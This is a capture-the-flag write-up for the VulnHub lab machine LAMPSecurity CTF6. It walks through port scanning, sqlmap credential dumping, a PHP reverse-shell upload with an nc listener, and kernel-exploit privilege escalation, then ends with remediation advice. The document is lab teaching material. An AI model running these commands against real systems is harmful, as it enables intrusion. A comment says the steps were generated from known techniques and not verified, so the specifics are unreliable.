# LAMPSecurity: CTF6 — Writeup

<!-- generated from known techniques; verify against live VM -->

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Root Flag** | /root/flag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/lampsecurity-ctf6,85/) |

## Attack Summary

nmap → web app SQLi (phpMyAdmin or CMS) → credential dump → SSH/shell → kernel/SUID exploit → root

## Methodology

1. Network discovery + port scan
2. Web application enumeration
3. SQL injection → admin credentials
4. Shell access via web upload or SSH
5. Kernel exploit or SUID privesc → root

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Expected open ports: 22 (SSH), 80 (HTTP), 3306 (MySQL), possibly 8080.

---

## Step 2: Web Application Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50
nikto -h http://<TARGET_IP>/
```

Look for: CMS login pages, phpMyAdmin, file upload forms, admin panels.

---

## Step 3: SQL Injection

Identify injectable parameters in the web application:

```bash
sqlmap -u "http://<TARGET_IP>/index.php?id=1" --dbs --batch
sqlmap -u "http://<TARGET_IP>/index.php?id=1" -D webapp -T users --dump --batch
```

Extract admin credentials from the users table.

---

## Step 4: Shell Access

**Option A — CMS admin panel file upload:**
1. Log in with extracted credentials
2. Upload PHP reverse shell via file manager or plugin
3. Trigger shell:

```bash
nc -lvp 4444
curl http://<TARGET_IP>/uploads/shell.php
```

**Option B — SSH:**
```bash
ssh admin@<TARGET_IP>
```

Upgrade shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 5: Privilege Escalation

```bash
uname -a          # check kernel version
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

For older kernels (2.6.x), use a local privilege escalation exploit:

```bash
# Example: dirty cow or older kernel LPE
searchsploit linux kernel <version>
gcc exploit.c -o exploit && ./exploit
```

```bash
whoami
# root
cat /root/flag.txt
```

---

## Lessons Learned

1. **SQLi in CMS** exposes admin credentials enabling full application takeover
2. **File upload with no validation** allows arbitrary PHP execution
3. **Outdated kernels** in lab VMs are direct privesc vectors — patch management is critical

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| SQL injection | Parameterized queries, WAF rules |
| Unrestricted file upload | Validate MIME type, store outside web root, disable PHP execution in upload dir |
| Outdated kernel | Apply security patches; use supported OS versions |
| MySQL exposed externally | Bind to 127.0.0.1 |
